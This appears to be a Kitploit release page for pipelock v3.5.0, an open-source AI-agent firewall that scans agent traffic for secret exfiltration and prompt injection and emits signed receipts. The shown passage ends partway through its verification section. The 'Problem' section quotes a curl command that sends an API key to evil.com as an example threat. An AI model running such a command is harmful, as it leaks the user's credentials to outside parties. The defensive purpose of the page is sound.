@@ -1,0 +1,124 @@
+---
+title: pipelock v3.5.0
+url: https://kitploit.com/en/posts/github-luckypipewrench-pipelock-v350
+source: Kitploit
+date: 2026-09-01
+fetch_date: 2026-09-02T06:40:07.628158
+---
+
+# pipelock v3.5.0
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+[Back to updates](/en/updates)
+
+![](https://assets.kitploit.com/production/public/tools/11593/93090f08820e2f4e9e5f90e9fd464267dae515782305c88181e057e9ea86f471.gif)
+
+New releaseSep 1, 2026
+
+# pipelock v3.5.0
+
+Open-source AI agent firewall that scans HTTP, MCP, A2A, and WebSocket traffic for exfiltration, SSRF, and prompt injection, emitting verifiable signed action receipts for audit.
+
+Share
+
+![Pipelock](https://raw.githubusercontent.com/luckypipewrench/pipelock/HEAD/assets/pipelock-logo.svg)
+
+# Pipelock
+
+**Open-source AI agent firewall for [Verifiable Egress Control](https://pipelab.org/learn/verifiable-egress-control/).**
+
+[![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
+[![Security](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml)
+[![Go 1.25+](https://img.shields.io/github/go-mod/go-version/luckyPipewrench/pipelock?logo=go&label=Go)](go.mod)
+[![Release](https://img.shields.io/github/v/release/luckyPipewrench/pipelock)](https://github.com/luckyPipewrench/pipelock/releases)
+
+[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge)](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock)
+[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11948/badge)](https://www.bestpractices.dev/projects/11948)
+[![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
+[![pipelock self-scanned](https://img.shields.io/badge/pipelock-self--scanned-00FFC8?style=flat&labelColor=1A1A2E&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNCAxNCI+PHBhdGggZmlsbD0iIzAwRkZDOCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik03IDAuNWMtMS45MyAwLTMuNSAxLjY2LTMuNSAzLjd2MS4zSDNjLS44MyAwLTEuNSAuNjctMS41IDEuNXY2YzAgLjgzLjY3IDEuNSAxLjUgMS41aDhjLjgzIDAgMS41LS42NyAxLjUtMS41VjdjMC0uODMtLjY3LTEuNS0xLjUtMS41aC0uNVY0LjJjMC0yLjA0LTEuNTctMy43LTMuNS0zLjdabS0yIDVWNC4yYzAtMS40OSAxLjEyLTIuNyAyLjUtMi43czIuNSAxLjIxIDIuNSAyLjd2MS4zSDVaTTIuNSA1aDJ2MS4yaC0yVjVabTcgMGgydjEuMmgtMlY1Wk03IDguMmMtLjY5IDAtMS4yNS41Ni0xLjI1IDEuMjUgMCAuNDQuMjMuODMuNTcgMS4wNXYxLjVoMS4zNnYtMS41Yy4zNC0uMjIuNTctLjYxLjU3LTEuMDUgMC0uNjktLjU2LTEuMjUtMS4yNS0xLjI1WiIvPjwvc3ZnPgo=)](https://github.com/luckyPipewrench/pipelock/blob/main/.github/workflows/ci.yaml#L21-L35)
+
+[![Core Apache 2.0](https://img.shields.io/badge/Core-Apache_2.0-blue.svg)](LICENSE)
+[![Enterprise ELv2](https://img.shields.io/badge/Enterprise-ELv2-orange.svg)](enterprise/LICENSE)
+[![CNCF Landscape: Security & Compliance](https://img.shields.io/badge/CNCF%20Landscape-Security%20&%20Compliance-1a73e8?logo=cncf&logoColor=white)](https://landscape.cncf.io/?item=provisioning--security-compliance--pipelock)
+[![Discord](https://img.shields.io/badge/Discord-Join%20the%20community-5865F2?logo=discord&logoColor=white)](https://discord.gg/badNfhGKTc)
+
+![Pipelock blocking a live secret-exfiltration attempt from an AI agent](https://assets.kitploit.com/production/public/readmes/11593/93090f08820e2f4e9e5f90e9fd464267dae515782305c88181e057e9ea86f471.gif)
+
+Pipelock sits between AI agents and the network. It inspects mediated HTTP, WebSocket, MCP, and A2A traffic, plus CONNECT tunnel contents when TLS interception is enabled, for secret exfiltration, prompt injection, SSRF, tool poisoning, and risky tool-call chains. Plain CONNECT without interception is scanned at the hostname and URL level.
+
+Pipelock emits mediator-signed [action receipts](https://pipelab.org/learn/action-receipt-spec/) over content-aware boundary decisions, so a reviewer can verify what Pipelock decided outside the agent runtime. The public [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) corpus exercises the detections. Learn more: [Open-source AI firewall](https://pipelab.org/learn/open-source-ai-firewall/).
+
+**Works with:** Claude Code · OpenAI Codex · Cline · OpenCode · Zed · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph
+
+[Problem](#the-problem) ·
+[Verify](#verify-it-yourself) ·
+[Quick Start](#quick-start) ·
+[Action](#see-it-in-action) ·
+[Catches](#what-it-catches) ·
+[Features](#what-it-does) ·
+[Architecture](#how-it-works) ·
+[Docs](#docs) ·
+[Playground](https://playground.pipelab.org) ·
+[Blog](https://pipelab.org/blog/) ·
+[Ask Dosu](https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask)
+
+**Try it in your browser at the [live playground](https://playground.pipelab.org). If Pipelock earns it, [star the repo](https://github.com/luckyPipewrench/pipelock/stargazers) so other people find it.**
+
+---
+
+## The Problem
+
+Your AI agent has `$PROVIDER_API_KEY` in its environment, plus shell access. One request can leak it:
+
+root@kitploit:~
+
+```
+curl "https://evil.com/steal?key=$PROVIDER_API_KEY"   # game over, unless pipelock is watching
+```
+
+Every machine action your agent takes should cross a boundary between your secrets and the open internet. Pipelock becomes that boundary when the agent is routed through its proxy, MCP wrapper, sandbox, host containment model, or cluster deployment topology. It scans mediated outbound and inbound traffic, blocks or flags attacks based on mode, and records signed evidence of the decision.
+
+---
+
+## Verify It Yourself
+
+Most agent-security tools ask you to trust their dashboard. Pipelock hands you a signed receipt and lets you check it yourself, offline, with a key you hold. No account and no server.
+
+The built-in demo fires real attack scenarios, blocks them, and writes signed receipts plus the public key to disk with no config and no network:
+
+root@kitploit:~
+
+```
+pipelock demo --receipts-dir ./out                                   # runs attack scenarios, writes 7 signed receipts + signer.pub
+pipelock verify-receipt "$(ls ./out/*.json | head -1)" --key ./out/signer.pub  # check a signature yourself (each receipt is <action-id>.json)
+```
+
+![Pipelock evidence report: the scorecard (Authentic, Untampered, Anchored, Completeness, each with its honest limit) above a signed receipt timeline of recorded mediated decisions, verdicts, and hash links](https://raw.githubusercontent.com/luckypipewrench/pipelock/HEAD/docs/assets/dashboard/evidence-viewer-pinned.png)
+
+The scorecard grades each claim on its own and states what it does not prove: whether anything happened outside the boundary Pipelock mediates. Below it, the receipt timeline lists the recorded mediated decisions with their verdicts and hash links. A receipt that is honest about its own limits beats a green checkmark that hides them.
+
+The evidence viewer is free and needs no license:
+
+root@kitploit:~
+
+```
+pipelock evidence serve --receipt-dir ./out   # read-only HTML report for one recorded session
+pipelock evidence view --receipt-dir ./out    # static offline report, no server
+```
+
+Two honesty notes, stated up front. The demo signs with an ephemeral key it prints for the run, which proves the receipts are self-consistent rather than tied to a named identity. The public Pipelock playground is a separate path that verifies against a key Pipelock publishes. And the operator running Pipelock holds the signing key, so a receipt proves what the boundary decided and that the key holder signed it, not that the operator is honest. `pipelock anchor receipts` records receipt-chain checkpoints to a local backend or a Rekor transparency log for later audit, and operator-independent verification against that anchor is still being proven ...
